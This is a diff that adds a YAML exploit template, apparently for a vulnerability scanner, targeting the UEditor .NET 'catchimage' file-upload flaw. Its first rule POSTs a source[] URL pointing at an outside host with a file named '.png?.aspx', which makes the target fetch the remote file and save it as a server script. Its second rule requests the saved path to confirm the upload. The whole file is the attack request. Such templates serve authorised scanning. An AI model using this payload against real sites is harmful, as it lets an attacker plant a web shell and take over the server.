@@ -1,0 +1,25 @@
+name: ueditor 文件上传
+rules:
+  r2:
+    request:
+      method: POST
+      path: /net/controller.ashx?action=catchimage
+      headers:
+        user-agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
+        Content-Type: 'application/x-www-form-urlencoded'
+      body: 'source[]=http://192.168.0.138:81/net/upload/image/20230303/6381345665059378488124281.png?.aspx'
+    expression: response.status == 200
+    output:
+      paht: '"\"url\":\"(?P<path>.+?)\"}]}".bsubmatch(response.body)'
+      result: paht['path']
+      reptitle: paht['path']
+  r3:
+    request:
+      method: GET
+      path: /net/{{result}}
+      headers:
+        user-agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
+    expression: response.status == 200
+expression: r2() && r3()
+detail:
+  author: qingmu
